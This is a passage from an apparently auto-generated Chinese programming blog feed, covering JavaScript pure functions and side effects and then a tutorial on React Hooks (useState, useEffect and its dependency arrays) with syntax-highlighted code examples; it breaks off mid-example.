class="line">&#125;</span><br><span class="line">add() <span class="comment">// 123</span></span><br><span class="line">add() <span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> add = <span class="function">(<span class="params">num1, num2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2</span><br><span class="line">&#125;</span><br><span class="line">add(<span class="number">1</span>, <span class="number">2</span>) <span class="comment">// 3</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">2</span>) <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> add = <span class="function">(<span class="params">obj</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br><span class="line">add(&#123; <span class="attr">name</span>: <span class="string">'jack'</span> &#125;) <span class="comment">// &#123; name: 'jack' &#125;</span></span><br><span class="line">add(&#123; <span class="attr">name</span>: <span class="string">'jack'</span> &#125;) <span class="comment">// &#123; name: 'jack' &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不是纯函数：</span></span><br><span class="line"><span class="keyword">const</span> add = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.random()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add() <span class="comment">// 0.12311293827497123</span></span><br><span class="line">add() <span class="comment">// 0.82239841238741814</span></span><br></pre></td></tr></table></figure><p>JS副作用：</p><ul><li>如果一个函数或其他操作<strong>修改了其局部环境之外的状态变量值</strong>，那么它就被称为有副作用</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 无副作用</span></span><br><span class="line"><span class="keyword">const</span> add = <span class="function">(<span class="params">num1, num2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2</span><br><span class="line">&#125;</span><br><span class="line">add(<span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 有副作用：</span></span><br><span class="line"><span class="keyword">let</span> c = <span class="number">0</span></span><br><span class="line"><span class="keyword">const</span> add = <span class="function">(<span class="params">num1, num2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 函数外部的环境产生了影响，所以是有副作用的</span></span><br><span class="line">  c = <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> num1 + num2</span><br><span class="line">&#125;</span><br><span class="line">add(<span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 有副作用</span></span><br><span class="line"><span class="keyword">const</span> add = <span class="function">(<span class="params">obj</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 因为直接修改了参数的值，对外部的数据产生了影响</span></span><br><span class="line">obj.num = <span class="number">123</span></span><br><span class="line">  <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> o = &#123;&#125;</span><br><span class="line">add(o)</span><br><span class="line"><span class="built_in">console</span>.log(o) <span class="comment">// &#123; num: 123 &#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Redux-概念&quot;&gt;&lt;a href=&quot;#Redux-概念&quot; class=&quot;headerlink&quot; title=&quot;Redux-概念&quot;&gt;&lt;/a&gt;Redux-概念&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Redux 是 React 中最常用的状态管理工具（状态容器）&lt;/
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="Redux" scheme="//www.shen.ee/tags/Redux/"/>
    
      <category term="Redux状态管理工具" scheme="//www.shen.ee/tags/Redux%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/"/>
    
      <category term="状态管理工具" scheme="//www.shen.ee/tags/%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/"/>
    
      <category term="action" scheme="//www.shen.ee/tags/action/"/>
    
      <category term="reducer" scheme="//www.shen.ee/tags/reducer/"/>
    
      <category term="store" scheme="//www.shen.ee/tags/store/"/>
    
  </entry>
  
  <entry>
    <title>深入浅出Hooks</title>
    <link href="//www.shen.ee/article/25844.html"/>
    <id>//www.shen.ee/article/25844.html</id>
    <published>2022-06-15T03:38:39.000Z</published>
    <updated>2022-07-07T09:17:39.385Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Hooks-介绍"><a href="#Hooks-介绍" class="headerlink" title="Hooks-介绍"></a>Hooks-介绍</h2><ul><li>hooks 解释<ul><li><code>Hooks</code>：钩子、钓钩、钩住 ，<code>Hooks</code> 是 <strong>React v16.8</strong> 中的新增功能</li></ul></li><li>hooks 作用<ul><li>为<strong>函数组件</strong>提供状态、生命周期等原本 class 组件中提供的 React 功能</li><li>可以理解为通过 Hooks 为函数组件钩入 class 组件的特性</li><li>注意：<strong>Hooks 只能在函数组件中使用</strong>，自此，函数组件成为 React 的新宠儿</li></ul></li><li>React v16.8 版本前后，组件开发模式的对比<ul><li>React v16.8 以前： class 组件(提供状态) + 函数组件(展示内容)</li><li>React v16.8 及其以后：<ol><li>class 组件(提供状态) + 函数组件(展示内容)</li><li>Hooks(提供状态) + 函数组件(展示内容)</li><li>混用以上两种方式：部分功能用 class 组件，部分功能用 Hooks+函数组件</li></ol></li></ul></li></ul><p><strong>总结</strong>：</p><ul><li>虽然有了 Hooks，但 React 官方并没有计划从 React 库中移除 class</li><li>有了 Hooks 以后，不能再把<strong>函数组件</strong>称为<del>无状态组件</del>了，因为 Hooks 为函数组件提供了状态</li></ul><h2 id="Hooks-解决的问题"><a href="#Hooks-解决的问题" class="headerlink" title="Hooks-解决的问题"></a>Hooks-解决的问题</h2><ol><li>组件的状态逻辑复用问题<ul><li>在 Hooks 之前，组件的状态逻辑复用经历了：mixins（混入）、HOCs（高阶组件）、render-props 等模式</li><li>（早已废弃）mixins 的问题：1 数据来源不清晰 2 命名冲突</li><li>HOCs、render-props 的问题：重构组件结构，导致组件形成 JSX 嵌套地狱问题</li></ul></li><li>class 组件自身的问题<ul><li>选择：函数组件和 class 组件之间的区别以及使用哪种组件更合适</li><li>需要理解 class 中的 this 是如何工作的</li><li>相互关联且需要对照修改的代码被拆分到不同生命周期函数中</li><li>相比于函数组件来说，不利于代码压缩和优化，也不利于 TS 的类型推导</li></ul></li></ol><h2 id="Hooks-渐进策略"><a href="#Hooks-渐进策略" class="headerlink" title="Hooks-渐进策略"></a>Hooks-渐进策略</h2><ol><li>什么是渐进式策略（项目开发场景）<a href="https://zh-hans.reactjs.org/docs/hooks-intro.html" target="_blank" rel="noopener">文档</a><ul><li>不推荐直接使用 Hooks 大规模重构现有组件</li><li>推荐：新功能用 Hooks，复杂功能实现不了的，也可以继续用 class</li><li>找一个功能简单、非核心功能的组件开始使用 hooks</li></ul></li><li>在 hooks 中开发会使用那些知识？<ul><li>class 组件相关的 API 在 hooks 中不可用<ul><li>class 自身语法，比如，constructor、static 等</li><li>钩子函数，<code>componentDidMount</code>、<code>componentDidUpdate</code>、<code>componentWillUnmount</code></li><li><code>this</code> 相关的用法</li></ul></li><li>原来学习的 React 内容还是要用的<ul><li>JSX：<code>{}</code>、<code>onClick={handleClick}</code>、条件渲染、列表渲染、样式处理等</li><li>组件：函数组件、组件通讯</li><li>React 开发理念：<code>单向数据流</code>、<code>状态提升</code> 等</li><li>解决问题的思路、技巧、常见错误的分析等</li></ul></li></ul></li></ol><p><strong>总结</strong>：</p><ol><li>react 没有计划从 React 中移除 class</li><li>react 将继续为 class 组件提供支持</li><li>可以在项目中同时使用 hooks 和 class</li></ol><h2 id="useState-基本使用"><a href="#useState-基本使用" class="headerlink" title="useState-基本使用"></a>useState-基本使用</h2><h3 id="useState-作用"><a href="#useState-作用" class="headerlink" title="useState 作用"></a>useState 作用</h3><ul><li>为函数组件提供状态</li><li>它是一个 hook，就是一个特殊的函数，让你在函数组件中获取状态等 React 特性。</li><li>名称上看 hook 都以<code>use</code>开头<code>useXxx</code></li></ul><h3 id="useState-语法"><a href="#useState-语法" class="headerlink" title="useState 语法"></a>useState 语法</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参数：状态初始值(数值、字符串、数组，对象)</span></span><br><span class="line"><span class="comment">// 返回值：stateArray 是一个数组</span></span><br><span class="line"><span class="keyword">const</span> stateArray = useState(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 索引 0 表示：状态值（state）</span></span><br><span class="line"><span class="keyword">const</span> state = stateArray[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// 索引 1 表示：修改状态的函数（setState）</span></span><br><span class="line"><span class="keyword">const</span> setState = stateArray[<span class="number">1</span>];</span><br></pre></td></tr></table></figure><h3 id="useState-使用步骤"><a href="#useState-使用步骤" class="headerlink" title="useState 使用步骤"></a>useState 使用步骤</h3><ol><li>导入 <code>useState</code> hook</li><li>调用 <code>useState</code> 函数，并传入状态的初始值</li><li>从 <code>useState</code> 函数的返回值中，拿到状态和修改状态的函数</li><li>在 JSX 中展示状态</li><li>在按钮的点击事件中调用修改状态的函数，来更新状态</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Count = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// stateArray 是一个数组</span></span><br><span class="line">  <span class="keyword">const</span> stateArray = useState(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> state = stateArray[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">const</span> setState = stateArray[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &#123;<span class="comment">/* 展示状态值 */</span>&#125;</span><br><span class="line">      &lt;h1&gt;状态为：&#123;state&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &#123;/</span>* 点击按钮，让状态值 +<span class="number">1</span> *<span class="regexp">/&#125;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; setState(state + 1)&#125;&gt;+1&lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br></pre></td></tr></table></figure><h3 id="useState-写法正确姿势"><a href="#useState-写法正确姿势" class="headerlink" title="useState 写法正确姿势"></a>useState 写法正确姿势</h3><ul><li>数据函数需要符合业务语义，修改状态的函数名称以 <strong>set</strong> 开头，后面跟上状态的名称。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Count = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 解构：</span></span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;计数器：&#123;state&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; setState(state + 1)&#125;&gt;+1&lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li><p>给<code>useState</code>提供初始化值，返回数组。</p><ul><li>数组[0] 状态数据</li><li>数组[1] 修改状态函数</li></ul></li><li><p>参考写法：<code>const [count, setCount] = useState(0)</code></p></li></ul><h2 id="useState-读取和修改状态"><a href="#useState-读取和修改状态" class="headerlink" title="useState-读取和修改状态"></a>useState-读取和修改状态</h2><h3 id="读取状态"><a href="#读取状态" class="headerlink" title="读取状态"></a>读取状态</h3><ul><li>读取状态：<code>useState</code> 提供的状态，是函数内部的局部变量，可以在函数内的任意位置使</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> UserCom = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [user, setUser] = useState(&#123; <span class="attr">name</span>: <span class="string">'jack'</span>, <span class="attr">age</span>: <span class="number">18</span> &#125;);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;p&gt;姓名：&#123;user.name&#125;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">      &lt;p&gt;年龄：&#123;user.age&#125;&lt;/</span>p&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br></pre></td></tr></table></figure><h3 id="修改状态"><a href="#修改状态" class="headerlink" title="修改状态"></a>修改状态</h3><ul><li><code>setCount(newValue)</code> 是一个函数，参数表示：<strong>新的状态值</strong></li><li>调用该函数后，将<strong>使用新的状态值<code>替换</code>旧值</strong></li><li>修改状态后，因为状态发生了改变，所以该组件会重新渲染</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> UserCom = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [user, setUser] = useState(&#123; <span class="attr">name</span>: <span class="string">'jack'</span>, <span class="attr">age</span>: <span class="number">18</span> &#125;);</span><br><span class="line">  <span class="keyword">const</span> onAgeAdd = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    setUser(&#123;</span><br><span class="line">      ...user,</span><br><span class="line">      age: user.age + <span class="number">1</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;p&gt;姓名：&#123;user.name&#125;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">      &lt;p&gt;年龄：&#123;user.age&#125;&lt;/</span>p&gt;</span><br><span class="line">      &lt;button onClick=&#123;onAgeAdd&#125;&gt;年龄+<span class="number">1</span>&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li>修改状态的时候，一定要<strong>使用新的状态替换旧的状态</strong></li></ul><h2 id="useState-组件更新过程"><a href="#useState-组件更新过程" class="headerlink" title="useState-组件更新过程"></a>useState-组件更新过程</h2><h3 id="组件初始化时候的事情"><a href="#组件初始化时候的事情" class="headerlink" title="组件初始化时候的事情"></a>组件初始化时候的事情</h3><ol><li>从头开始执行该组件中的代码逻辑</li><li>调用 <code>useState(0)</code> 将传入的参数作为状态初始值，即：0</li><li>渲染组件，此时，获取到的状态 count 值为： 0</li></ol><h3 id="setState-后发生的事情"><a href="#setState-后发生的事情" class="headerlink" title="setState 后发生的事情"></a>setState 后发生的事情</h3><ol><li>点击按钮，调用 <code>setCount(count + 1)</code> 修改状态，因为状态发生改变，所以，该组件会重新渲染</li><li>组件重新渲染时，会再次执行该组件中的代码逻辑</li><li>再次调用 <code>useState(0)</code>，此时 <strong>React 内部会拿到最新的状态值而非初始值</strong>，比如，该案例中最新的状态值为 1</li><li>再次渲染组件，此时，获取到的状态 count 值为：1</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">const</span> Counter = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;计数器：&#123;count&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+1&lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li><strong>useState 的初始值(参数)只会在组件第一次渲染时生效</strong>，以后的每次渲染，useState 获取到都是最新的状态值。</li></ul><h2 id="useState-使用原则"><a href="#useState-使用原则" class="headerlink" title="useState-使用原则"></a>useState-使用原则</h2><h3 id="定义多个状态的原则"><a href="#定义多个状态的原则" class="headerlink" title="定义多个状态的原则"></a>定义多个状态的原则</h3><ul><li>调用 <code>useState</code> Hook 多次即可，每调用一次 useState Hook 可以提供一个状态</li><li><code>useState Hook</code> 多次调用返回的 [state, setState]，相互之间，互不影响</li><li>尽量按照业务来定义数据，不要全部定义在一起，因为是替换，不是合并</li></ul><h3 id="hook-函数书写位置原则"><a href="#hook-函数书写位置原则" class="headerlink" title="hook 函数书写位置原则"></a>hook 函数书写位置原则</h3><ul><li><strong>React Hooks 只能直接出现在 函数组件 中</strong></li><li><strong>React Hooks 不能嵌套在 if/for/其他函数 中</strong></li><li>原理：React 是按照 Hooks 的调用顺序来识别每一个 Hook，如果每次调用的顺序不同，导致 React 无法知道是哪一个 Hook</li></ul><p>可以通过开发者工具进行查看组件的 hooks</p><p><img src="https://oss.iyouhun.com/img/md/01.053a5fe6.png" alt="01.053a5fe6"></p><p><strong>总结：</strong></p><ul><li>只能在函数组件中使用，不能嵌套在 <code>分支循环语句</code> 中，react 存储 hooks 状态按顺序存储。</li></ul><h2 id="useEffect-副作用"><a href="#useEffect-副作用" class="headerlink" title="useEffect-副作用"></a>useEffect-副作用</h2><ol><li><code>side effect</code> 副作用专业解释<ul><li>在计算机科学中，如果一个函数或其他操作修改了其局部环境之外的状态变量值，那么它就被称为有副作用</li><li>在函数组件中：职责就是根据状态渲染 UI，其他的事情都是副作用</li></ul></li><li>通过生活例子，理解副作用<ul><li>999 感冒灵，主作用：用于感冒引起的头痛，发热，鼻塞，流涕，咽痛等</li><li>副作用：可见困倦、嗜睡、口渴、虚弱感</li></ul></li><li>使用函数组件常见的副作用<ul><li>对于 React 组件来说，<strong>主作用就是根据数据（state/props）渲染 UI</strong>，除此之外都是副作用（比如，手动修改 DOM）</li><li>常见的副作用（side effect）：数据（Ajax）请求、手动修改 DOM、localStorage、console.log 操作等</li><li>当你想要在函数组件中，<strong>处理副作用（side effect）时</strong>，就要使用 <strong>useEffect</strong> Hook 了</li></ul></li></ol><p><strong>总结：</strong></p><ul><li>对于 react 组件来说，除了渲染 UI 之外的其他操作，都可以称之为副作用</li></ul><h2 id="useEffect-基本使用"><a href="#useEffect-基本使用" class="headerlink" title="useEffect-基本使用"></a>useEffect-基本使用</h2><h3 id="语法介绍"><a href="#语法介绍" class="headerlink" title="语法介绍"></a>语法介绍</h3><ul><li>参数：回调函数（称为 <strong>effect</strong>），就是<strong>在该函数中写副作用代码</strong></li><li>执行时机：该 effect 会在组件第一次渲染以及每次组件更新后执行</li><li>相当于 componentDidMount + componentDidUpdate</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 书写副作用代码</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>例：count 更新的时候显示到标题</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useEffect &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Counter = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.title = <span class="string">`当前已点击 <span class="subst">$&#123;count&#125;</span> 次`</span>;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;计数器：&#123;count&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+1&lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li>在函数组件处理副作用 <code>useEffect(()=&gt;{})</code> 组件初始化，更新的时候执行</li></ul><h2 id="useEffect-依赖项"><a href="#useEffect-依赖项" class="headerlink" title="useEffect-依赖项"></a>useEffect-依赖项</h2><h3 id="默认使用-useEffect-的问题"><a href="#默认使用-useEffect-的问题" class="headerlink" title="默认使用 useEffect 的问题"></a>默认使用 useEffect 的问题</h3><ul><li><code>useEffect(()=&gt;{})</code> 只要状态发生更新 useEffect 的 effect 回调就会执行</li><li>如果组件中有另外一个状态，另一个状态更新时，刚刚的 effect 回调也会执行</li></ul><h3 id="useEffect-依赖项的使用"><a href="#useEffect-依赖项的使用" class="headerlink" title="useEffect 依赖项的使用"></a>useEffect 依赖项的使用</h3><ul><li>跳过不必要的执行，只在 count 变化时，才执行相应的 effect</li><li><code>useEffect(()=&gt;{},[依赖项])</code> 依赖项的值变化才会执行 effect</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useEffect &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Counter = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> [loading, setLoading] = useState(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.title = <span class="string">`当前已点击 <span class="subst">$&#123;count&#125;</span> 次`</span>;</span><br><span class="line">  &#125;, [count]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;计数器：&#123;count&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+1&lt;/</span>button&gt;</span><br><span class="line">      &lt;button onClick=&#123;() =&gt; setCount(!loading)&#125;&gt;切换 loading&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li><code>useEffect(()=&gt;{},[依赖项])</code> 依赖项可以指定某些状态变化再去执行副作用</li></ul><h2 id="useEffect-不要对依赖项撒谎"><a href="#useEffect-不要对依赖项撒谎" class="headerlink" title="useEffect-不要对依赖项撒谎"></a>useEffect-不要对依赖项撒谎</h2><ul><li>useEffect 完全指南：<a href="https://overreacted.io/zh-hans/a-complete-guide-to-useeffect/" target="_blank" rel="noopener">https://overreacted.io/zh-hans/a-complete-guide-to-useeffect/</a></li><li>useEffect 回调函数（effect）中用到的数据（比如，count）就是依赖数据，就应该出现在依赖项数组中</li><li>如果 useEffect 回调函数中用到了某个数据，但是，没有出现在依赖项数组中，就会导致一些 Bug 出现</li><li>所以，不要对 useEffect 的依赖撒谎</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 错误演示：</span></span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.title = <span class="string">'点击了'</span> + count + <span class="string">'次'</span>;</span><br><span class="line">  &#125;, []);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;计数器：&#123;count&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+1&lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li>副作用中使用的状态，需要写在依赖项中</li></ul><h2 id="useEffect-依赖是一个空数组"><a href="#useEffect-依赖是一个空数组" class="headerlink" title="useEffect-依赖是一个空数组"></a>useEffect-依赖是一个空数组</h2><ol><li>useEffect 的第二个参数，还可以是一个<strong>空数组（[]）</strong><ol><li>表示只在组件第一次渲染后执行 effect</li><li>该 effect 只会在组件第一次渲染后执行，因此可以执行像事件绑定等只需要执行一次的操作。</li><li>相当于 class 组件的 componentDidMount 钩子函数的作用</li></ol></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span 